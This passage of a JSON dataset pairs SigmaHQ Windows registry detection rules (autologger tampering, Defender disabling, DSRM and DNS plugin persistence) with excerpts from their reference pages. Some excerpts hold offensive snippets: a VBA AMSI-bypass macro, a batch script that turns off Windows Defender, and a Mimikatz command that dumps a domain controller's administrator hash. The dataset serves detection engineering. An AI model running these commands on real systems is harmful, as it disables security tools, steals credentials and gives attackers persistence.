        "https://twitter.com/MichalKoczwara/status/1553634816016498688",
        "https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/",
        "https://i.blackhat.com/EU-21/Wednesday/EU-21-Teodorescu-Veni-No-Vidi-No-Vici-Attacks-On-ETW-Blind-EDRs.pdf"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-01",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection_main": {
          "TargetObject|contains": "\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\"
        },
        "selection_values": {
          "TargetObject|contains": [
            "\\EventLog-",
            "\\Defender"
          ],
          "TargetObject|endswith": [
            "\\Enable",
            "\\Start"
          ],
          "Details": "DWORD (0x00000000)"
        },
        "filter_wevtutil": {
          "Image": "C:\\Windows\\system32\\wevtutil.exe"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_disable_autologger_sessions.yml"
  },
  "944": {
    "url": "https://i.blackhat.com/EU-21/Wednesday/EU-21-Teodorescu-Veni-No-Vidi-No-Vici-Attacks-On-ETW-Blind-EDRs.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential AutoLogger Sessions Tampering",
      "id": "f37b4bce-49d0-4087-9f5b-58bffda77316",
      "status": "test",
      "description": "Detects tampering with autologger trace sessions which is a technique used by attackers to disable logging",
      "references": [
        "https://twitter.com/MichalKoczwara/status/1553634816016498688",
        "https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/",
        "https://i.blackhat.com/EU-21/Wednesday/EU-21-Teodorescu-Veni-No-Vidi-No-Vici-Attacks-On-ETW-Blind-EDRs.pdf"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-01",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection_main": {
          "TargetObject|contains": "\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\"
        },
        "selection_values": {
          "TargetObject|contains": [
            "\\EventLog-",
            "\\Defender"
          ],
          "TargetObject|endswith": [
            "\\Enable",
            "\\Start"
          ],
          "Details": "DWORD (0x00000000)"
        },
        "filter_wevtutil": {
          "Image": "C:\\Windows\\system32\\wevtutil.exe"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_disable_autologger_sessions.yml"
  },
  "945": {
    "url": "https://www.microsoft.com/en-us/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/",
    "markdown": "# Office VBA + AMSI: Parting the veil on malicious macros **Published on September 12, 2018** --- As part of our continued efforts to tackle entire classes of threats, Office 365 client applications now integrate with Antimalware Scan Interface (AMSI), enabling antivirus and other security solutions to scan macros and other scripts at runtime to check for malicious behavior. Macro-based threats have always been a prevalent entry point for malware, but we have observed a resurgence in recent years. Continuous improvements in platform and application security have led to the decline of software exploits, and attackers have found a viable",
    "sigma_rule": {
      "title": "Disable Macro Runtime Scan Scope",
      "id": "ab871450-37dc-4a3a-997f-6662aa8ae0f1",
      "description": "Detects tampering with the MacroRuntimeScanScope registry key to disable runtime scanning of enabled macros",
      "status": "test",
      "date": "2022-10-25",
      "modified": "2023-08-17",
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/",
        "https://admx.help/?Category=Office2016&Policy=office16.Office.Microsoft.Policies.Windows::L_MacroRuntimeScanScope",
        "https://github.com/S3cur3Th1sSh1t/OffensiveVBA/blob/28cc6a2802d8176195ac19b3c8e9a749009a82a3/src/AMSIbypasses.vba"
      ],
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|contains|all": [
            "\\SOFTWARE\\",
            "\\Microsoft\\Office\\",
            "\\Common\\Security"
          ],
          "TargetObject|endswith": "\\MacroRuntimeScanScope",
          "Details": "DWORD (0x00000000)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_disable_macroruntimescanscope.yml"
  },
  "946": {
    "url": "https://admx.help/?Category=Office2016&Policy=office16.Office.Microsoft.Policies.Windows::L_MacroRuntimeScanScope",
    "markdown": "# Macro Runtime Scan Scope This policy setting specifies the behavior for both the VBA and Excel 4.0 (XLM) runtime scan features. Multiple Office apps support VBA macros, but XLM macros are only supported by Excel. Macros can only be scanned if the anti-virus software registers as an Antimalware Scan Interface (AMSI) provider on the device. If you enable this policy setting, you can choose from the following options to determine the macro runtime scanning behavior: - **Disable for all files (not recommended)**: If you choose this option, no runtime scanning of enabled macros will be performed. - **Enable for",
    "sigma_rule": {
      "title": "Disable Macro Runtime Scan Scope",
      "id": "ab871450-37dc-4a3a-997f-6662aa8ae0f1",
      "description": "Detects tampering with the MacroRuntimeScanScope registry key to disable runtime scanning of enabled macros",
      "status": "test",
      "date": "2022-10-25",
      "modified": "2023-08-17",
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/",
        "https://admx.help/?Category=Office2016&Policy=office16.Office.Microsoft.Policies.Windows::L_MacroRuntimeScanScope",
        "https://github.com/S3cur3Th1sSh1t/OffensiveVBA/blob/28cc6a2802d8176195ac19b3c8e9a749009a82a3/src/AMSIbypasses.vba"
      ],
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|contains|all": [
            "\\SOFTWARE\\",
            "\\Microsoft\\Office\\",
            "\\Common\\Security"
          ],
          "TargetObject|endswith": "\\MacroRuntimeScanScope",
          "Details": "DWORD (0x00000000)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_disable_macroruntimescanscope.yml"
  },
  "947": {
    "url": "https://github.com/S3cur3Th1sSh1t/OffensiveVBA/blob/28cc6a2802d8176195ac19b3c8e9a749009a82a3/src/AMSIbypasses.vba",
    "markdown": "# Code samples for AMSI bypass techniques relating to the blogpost on AMSI bypasses on Outflank ## AMSI Bypass approach that abuses trusted locations (sample for Word) ``` Sub autoopen() 'function called by the initial 'dropper' code, drops a dotm into %appdata\\microsoft templates curfile = ActiveDocument.Path & \"\\\" & ActiveDocument.Name templatefile = Environ(\"appdata\") & \"\\Microsoft\\Templates\\\" & DateDiff(\"s\", #1/1/1970#, Now()) & \".dotm\" ActiveDocument.SaveAs2 FileName:=templatefile, FileFormat:=wdFormatXMLTemplateMacroEnabled, AddToRecentFiles:=True ' save back to orig location, otherwise AMSI will kick in (as we are the template) ActiveDocument.SaveAs2 FileName:=curfile, FileFormat:=wdFormatXMLDocumentMacroEnabled ' now create a new file based on template Documents.Add Template:=templatefile, NewTemplate:=False, DocumentType:=0 End Sub Sub",
    "sigma_rule": {
      "title": "Disable Macro Runtime Scan Scope",
      "id": "ab871450-37dc-4a3a-997f-6662aa8ae0f1",
      "description": "Detects tampering with the MacroRuntimeScanScope registry key to disable runtime scanning of enabled macros",
      "status": "test",
      "date": "2022-10-25",
      "modified": "2023-08-17",
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/",
        "https://admx.help/?Category=Office2016&Policy=office16.Office.Microsoft.Policies.Windows::L_MacroRuntimeScanScope",
        "https://github.com/S3cur3Th1sSh1t/OffensiveVBA/blob/28cc6a2802d8176195ac19b3c8e9a749009a82a3/src/AMSIbypasses.vba"
      ],
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|contains|all": [
            "\\SOFTWARE\\",
            "\\Microsoft\\Office\\",
            "\\Common\\Security"
          ],
          "TargetObject|endswith": "\\MacroRuntimeScanScope",
          "Details": "DWORD (0x00000000)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_disable_macroruntimescanscope.yml"
  },
  "948": {
    "url": "https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/",
    "markdown": "",
    "sigma_rule": {
      "title": "Windows Defender Service Disabled - Registry",
      "id": "e1aa95de-610a-427d-b9e7-9b46cfafbe6a",
      "status": "test",
      "description": "Detects when an attacker or tool disables the  Windows Defender service (WinDefend) via the registry",
      "references": [
        "https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/",
        "https://web.archive.org/web/20211121135248/https://gist.github.com/anadr/7465a9fde63d41341136949f14c21105"
      ],
      "author": "Ján Trenčanský, frack113, AlertIQ, Nasreddine Bencherchali",
      "date": "2022-08-01",
      "modified": "2024-03-25",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Services\\WinDefend\\Start",
          "Details": "DWORD (0x00000004)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Administrator actions"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_disable_windows_defender_service.yml"
  },
  "949": {
    "url": "https://web.archive.org/web/20211121135248/https://gist.github.com/anadr/7465a9fde63d41341136949f14c21105",
    "markdown": "# quick-disable-windows-defender.bat ``` rem USE AT OWN RISK AS IS WITHOUT WARRANTY OF ANY KIND !!!!! rem https://technet.microsoft.com/en-us/itpro/powershell/windows/defender/set-mppreference rem To also disable Windows Defender Security Center include this rem reg add \"HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService\" /v \"Start\" /t REG_DWORD /d \"4\" /f rem 1 - Disable Real-time protection reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\"",
    "sigma_rule": {
      "title": "Windows Defender Service Disabled - Registry",
      "id": "e1aa95de-610a-427d-b9e7-9b46cfafbe6a",
      "status": "test",
      "description": "Detects when an attacker or tool disables the  Windows Defender service (WinDefend) via the registry",
      "references": [
        "https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/",
        "https://web.archive.org/web/20211121135248/https://gist.github.com/anadr/7465a9fde63d41341136949f14c21105"
      ],
      "author": "Ján Trenčanský, frack113, AlertIQ, Nasreddine Bencherchali",
      "date": "2022-08-01",
      "modified": "2024-03-25",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Services\\WinDefend\\Start",
          "Details": "DWORD (0x00000004)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Administrator actions"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_disable_windows_defender_service.yml"
  },
  "950": {
    "url": "https://persistence-info.github.io/Data/diskcleanuphandler.html",
    "markdown": "# persistence-info.github.io ## Disk Cleanup Handler ### Location: - `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\` - `HKCR\\CLSID` ### Classification: | Criteria | Value | |------------------|--------------------| | Permissions | Admin | | Security context | User | | Persistence type | Registry | | Code type | DLL[^1] | | Launch type | User initiated[^2] | | Impact | Non-destructive | | OS Version | All OS versions | | Dependencies | OS only | | Toolset | Scriptable | ### Description: > The disk cleanup manager is part of the operating system. It displays the dialog box […] The user has the option of enabling",
    "sigma_rule": {
      "title": "Persistence Via Disk Cleanup Handler - Autorun",
      "id": "d4e2745c-f0c6-4bde-a3ab-b553b3f693cc",
      "status": "test",
      "description": "Detects when an attacker modifies values of the Disk Cleanup Handler in the registry to achieve persistence via autorun.\nThe disk cleanup manager is part of the operating system.\nIt displays the dialog box […] The user has the option of enabling or disabling individual handlers by selecting or clearing their check box in the disk cleanup manager's UI.\nAlthough Windows comes with a number of disk cleanup handlers, they aren't designed to handle files produced by other applications.\nInstead, the disk cleanup manager is designed to be flexible and extensible by enabling any developer to implement and register their own disk cleanup handler.\nAny developer can extend the available disk cleanup services by implementing and registering a disk cleanup handler.\n",
      "references": [
        "https://persistence-info.github.io/Data/diskcleanuphandler.html",
        "https://www.hexacorn.com/blog/2018/09/02/beyond-good-ol-run-key-part-86/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-21",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "root": {
          "TargetObject|contains": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\"
        },
        "selection_autorun": {
          "TargetObject|contains": "\\Autorun",
          "Details": "DWORD (0x00000001)"
        },
        "selection_pre_after": {
          "TargetObject|contains": [
            "\\CleanupString",
            "\\PreCleanupString"
          ],
          "Details|contains": [
            "cmd",
            "powershell",
            "rundll32",
            "mshta",
            "cscript",
            "wscript",
            "wsl",
            "\\Users\\Public\\",
            "\\Windows\\TEMP\\",
            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
          ]
        },
        "condition": "root and 1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_disk_cleanup_handler_autorun_persistence.yml"
  },
  "951": {
    "url": "https://www.hexacorn.com/blog/2018/09/02/beyond-good-ol-run-key-part-86/",
    "markdown": "# Beyond good ol’ Run key, Part 86 Posted on 2018-09-02 It is a well-known fact that Windows features are the best persistence mechanisms, and… the one I am going to talk about is yet another one of these… If you ever ran into a problem of having not enough space on your hard drive you are certainly familiar with the Disk Cleanup program: ```image Alt: Disk Cleanup Description: The image displays the user interface of the Disk Cleanup tool in Windows. It shows a window titled 'Disk Cleanup for (C:)', indicating that the utility is being used to free",
    "sigma_rule": {
      "title": "Persistence Via Disk Cleanup Handler - Autorun",
      "id": "d4e2745c-f0c6-4bde-a3ab-b553b3f693cc",
      "status": "test",
      "description": "Detects when an attacker modifies values of the Disk Cleanup Handler in the registry to achieve persistence via autorun.\nThe disk cleanup manager is part of the operating system.\nIt displays the dialog box […] The user has the option of enabling or disabling individual handlers by selecting or clearing their check box in the disk cleanup manager's UI.\nAlthough Windows comes with a number of disk cleanup handlers, they aren't designed to handle files produced by other applications.\nInstead, the disk cleanup manager is designed to be flexible and extensible by enabling any developer to implement and register their own disk cleanup handler.\nAny developer can extend the available disk cleanup services by implementing and registering a disk cleanup handler.\n",
      "references": [
        "https://persistence-info.github.io/Data/diskcleanuphandler.html",
        "https://www.hexacorn.com/blog/2018/09/02/beyond-good-ol-run-key-part-86/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-21",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "root": {
          "TargetObject|contains": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\"
        },
        "selection_autorun": {
          "TargetObject|contains": "\\Autorun",
          "Details": "DWORD (0x00000001)"
        },
        "selection_pre_after": {
          "TargetObject|contains": [
            "\\CleanupString",
            "\\PreCleanupString"
          ],
          "Details|contains": [
            "cmd",
            "powershell",
            "rundll32",
            "mshta",
            "cscript",
            "wscript",
            "wsl",
            "\\Users\\Public\\",
            "\\Windows\\TEMP\\",
            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
          ]
        },
        "condition": "root and 1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_disk_cleanup_handler_autorun_persistence.yml"
  },
  "952": {
    "url": "https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83",
    "markdown": "# Feature, not bug: DNSAdmin to DC compromise in one line **May 8, 2017** --- ## Background In addition to implementing their own DNS server, Microsoft has also implemented their own management protocol for that server, to allow for easy management and integration with Active Directory domains. By default, domain controllers are also DNS servers; DNS servers need to be reachable and usable by mostly every domain user. This, in turn, exposes quite some attack surface on domain controllers — on one part, the DNS protocol itself and on the other, the management protocol, which is based on RPC. We",
    "sigma_rule": {
      "title": "New DNS ServerLevelPluginDll Installed",
      "id": "e61e8a88-59a9-451c-874e-70fcc9740d67",
      "related": [
        {
          "id": "cbe51394-cd93-4473-b555-edf0144952d9",
          "type": "derived"
        },
        {
          "id": "f63b56ee-3f79-4b8a-97fb-5c48007e8573",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the installation of a DNS plugin DLL via ServerLevelPluginDll parameter in registry, which can be used to execute code in context of the DNS server (restart required)",
      "references": [
        "https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83",
        "https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2017-05-08",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\services\\DNS\\Parameters\\ServerLevelPluginDll"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_dns_server_level_plugin_dll.yml"
  },
  "953": {
    "url": "https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html",
    "markdown": "# Hunting DNS Server Level Plugin dll injection 09 May 2017 This post is accompanying my addition to the ThreatHunter-Playbook to enhance the IOC I added there with some details to detect the DNS server level plugin dll injection, published this week. I am not going to make a detailed description for that attack, as there are already plenty of great resources: - Feature, not bug: DNSAdmin to DC compromise in one line. - Abusing DNSAdmins privilege for escalation in Active Directory If you want to play with this DNS server feature just use one of the following DNS Server",
    "sigma_rule": {
      "title": "New DNS ServerLevelPluginDll Installed",
      "id": "e61e8a88-59a9-451c-874e-70fcc9740d67",
      "related": [
        {
          "id": "cbe51394-cd93-4473-b555-edf0144952d9",
          "type": "derived"
        },
        {
          "id": "f63b56ee-3f79-4b8a-97fb-5c48007e8573",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the installation of a DNS plugin DLL via ServerLevelPluginDll parameter in registry, which can be used to execute code in context of the DNS server (restart required)",
      "references": [
        "https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83",
        "https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2017-05-08",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\services\\DNS\\Parameters\\ServerLevelPluginDll"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_dns_server_level_plugin_dll.yml"
  },
  "954": {
    "url": "https://adsecurity.org/?p=1785",
    "markdown": "# Sneaky Active Directory Persistence #13: DSRM Persistence v2 *September 25, 2015* *Categories: ActiveDirectorySecurity, Microsoft Security, Security Conference Presentation/Video, Technical Reference* The content in this post describes a method by which an attacker could persist administrative access to Active Directory after having Domain Admin level rights for 5 minutes. I presented on this AD persistence method at DerbyCon (2015). I also presented and posted on DSRM as a persistence method previously. Complete list of Sneaky Active Directory Persistence Tricks posts ## The Directory Restore Mode Account Every Domain Controller has an internal “Break glass” local administrator account to DC called",
    "sigma_rule": {
      "title": "Directory Service Restore Mode(DSRM) Registry Value Tampering",
      "id": "b61e87c0-50db-4b2e-8986-6a2be94b33b0",
      "related": [
        {
          "id": "53ad8e36-f573-46bf-97e4-15ba5bf4bb51",
          "type": "similar"
        }
      ],
      "status": "experimental",
      "description": "Detects changes to \"DsrmAdminLogonBehavior\" registry value.\nDuring a Domain Controller (DC) promotion, administrators create a Directory Services Restore Mode (DSRM) local administrator account with a password that rarely changes. The DSRM account is an “Administrator” account that logs in with the DSRM mode when the server is booting up to restore AD backups or recover the server from a failure.\nAttackers could abuse DSRM account to maintain their persistence and access to the organization's Active Directory.\nIf the \"DsrmAdminLogonBehavior\" value is set to \"0\", the administrator account can only be used if the DC starts in DSRM.\nIf the \"DsrmAdminLogonBehavior\" value is set to \"1\", the administrator account can only be used if the local AD DS service is stopped.\nIf the \"DsrmAdminLogonBehavior\" value is set to \"2\", the administrator account can always be used.\n",
      "references": [
        "https://adsecurity.org/?p=1785",
        "https://www.sentinelone.com/blog/detecting-dsrm-account-misconfigurations/",
        "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dsrm-credentials"
      ],
      "author": "Nischal Khadgi",
      "date": "2024-07-11",
      "tags": [
        "attack.persistence",
        "attack.t1556"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Control\\Lsa\\DsrmAdminLogonBehavior"
        },
        "filter_main_default_value": {
          "Details": "DWORD (0x00000000)"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_dsrm_tampering.yml"
  },
  "955": {
    "url": "https://www.sentinelone.com/blog/detecting-dsrm-account-misconfigurations/",
    "markdown": "# Detecting DSRM Account Misconfigurations *August 24, 2021* During a Domain Controller (DC) promotion, administrators create a Directory Services Restore Mode (DSRM) local administrator account with a password that rarely changes. The DSRM account is an “Administrator” account that logs in with the DSRM mode when the server is booting up to restore AD backups or recover the server from a failure. Attackers could abuse DSRM account to maintain their persistence and access to the organization’s Active Directory. Administrators set the DSRM password while configuring Active Directory and typically do not follow the recommendation of changing its passwords regularly. Knowing",
    "sigma_rule": {
      "title": "Directory Service Restore Mode(DSRM) Registry Value Tampering",
      "id": "b61e87c0-50db-4b2e-8986-6a2be94b33b0",
      "related": [
        {
          "id": "53ad8e36-f573-46bf-97e4-15ba5bf4bb51",
          "type": "similar"
        }
      ],
      "status": "experimental",
      "description": "Detects changes to \"DsrmAdminLogonBehavior\" registry value.\nDuring a Domain Controller (DC) promotion, administrators create a Directory Services Restore Mode (DSRM) local administrator account with a password that rarely changes. The DSRM account is an “Administrator” account that logs in with the DSRM mode when the server is booting up to restore AD backups or recover the server from a failure.\nAttackers could abuse DSRM account to maintain their persistence and access to the organization's Active Directory.\nIf the \"DsrmAdminLogonBehavior\" value is set to \"0\", the administrator account can only be used if the DC starts in DSRM.\nIf the \"DsrmAdminLogonBehavior\" value is set to \"1\", the administrator account can only be used if the local AD DS service is stopped.\nIf the \"DsrmAdminLogonBehavior\" value is set to \"2\", the administrator account can always be used.\n",
      "references": [
        "https://adsecurity.org/?p=1785",
        "https://www.sentinelone.com/blog/detecting-dsrm-account-misconfigurations/",
        "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dsrm-credentials"
      ],
      "author": "Nischal Khadgi",
      "date": "2024-07-11",
      "tags": [
        "attack.persistence",
        "attack.t1556"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Control\\Lsa\\DsrmAdminLogonBehavior"
        },
        "filter_main_default_value": {
          "Details": "DWORD (0x00000000)"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_dsrm_tampering.yml"
  },
  "956": {
    "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dsrm-credentials",
    "markdown": "# DSRM Credentials There is a **local administrator** account inside each **DC**. Having admin privileges in this machine you can use mimikatz to **dump the local Administrator hash**. Then, modifying a registry to **activate this password** so you can remotely access to this local Administrator user. First we need to **dump** the **hash** of the **local Administrator** user inside the DC: ``` Invoke-Mimikatz -Command '\"token::elevate\" \"lsadump::sam\"' ``` Then we need to check if that account will work, and if the registry key has the value \"0\" or it doesn't exist you need to **set it to \"2\"**: ``` Get-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\"",
    "sigma_rule": {
      "title": "Directory Service Restore Mode(DSRM) Registry Value Tampering",
      "id": "b61e87c0-50db-4b2e-8986-6a2be94b33b0",
      "related": [
        {
          "id": "53ad8e36-f573-46bf-97e4-15ba5bf4bb51",
          "type": "similar"
        }
      ],
      "status": "experimental",
      "description": "Detects changes to \"DsrmAdminLogonBehavior\" registry value.\nDuring a Domain Controller (DC) promotion, administrators create a Directory Services Restore Mode (DSRM) local administrator account with a password that rarely changes. The DSRM account is an “Administrator” account that logs in with the DSRM mode when the server is booting up to restore AD backups or recover the server from a failure.\nAttackers could abuse DSRM account to maintain their persistence and access to the organization's Active Directory.\nIf the \"DsrmAdminLogonBehavior\" value is set to \"0\", the administrator account can only be used if the DC starts in DSRM.\nIf the \"DsrmAdminLogonBehavior\" value is set to \"1\", the administrator account can only be used if the local AD DS service is stopped.\nIf the \"DsrmAdminLogonBehavior\" value is set to \"2\", the administrator account can always be used.\n",
      "references": [
        "https://adsecurity.org/?p=1785",
        "https://www.sentinelone.com/blog/detecting-dsrm-account-misconfigurations/",
        "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dsrm-credentials"
      ],
      "author": "Nischal Khadgi",
      "date": "2024-07-11",
      "tags": [
        "attack.persistence",
        "attack.t1556"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Control\\Lsa\\DsrmAdminLogonBehavior"
        },
        "filter_main_default_value": {
          "Details": "DWORD (0x00000000)"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_dsrm_tampering.yml"
  },
  "957": {
    "url": "https://www.microsoft.com/en-us/security/blog/2017/10/23/windows-defender-exploit-guard-reduce-the-attack-surface-against-next-generation-malware/",
    "markdown": "# Windows Defender Exploit Guard: Reduce the attack surface against next-generation malware **Published**: October 23, 2017 Windows Defender Exploit Guard is a new set of intrusion prevention capabilities that ships with the Windows 10 Fall Creators Update. The four components of Windows Defender Exploit Guard are designed to lock down the device against a wide variety of attack vectors and block behaviors commonly used in malware attacks, while enabling enterprises to balance their security risk and productivity requirements. Traditional antivirus technologies are an integral aspect of the endpoint security stack through the identification and removal of malicious executables using a",
    "sigma_rule": {
      "title": "Suspicious Application Allowed Through Exploit Guard",
      "id": "42205c73-75c8-4a63-9db1-e3782e06fda0",
      "status": "test",
      "description": "Detects applications being added to the \"allowed applications\" list of exploit guard in order to bypass controlled folder settings",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2017/10/23/windows-defender-exploit-guard-reduce-the-attack-surface-against-next-generation-malware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-05",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection_key": {
          "TargetObject|contains": "SOFTWARE\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Controlled Folder Access\\AllowedApplications"
        },
        "selection_paths": {
          "TargetObject|contains": [
            "\\Users\\Public\\",
            "\\AppData\\Local\\Temp\\",
            "\\Desktop\\",
            "\\PerfLogs\\",
            "\\Windows\\Temp\\"
          ]
        },
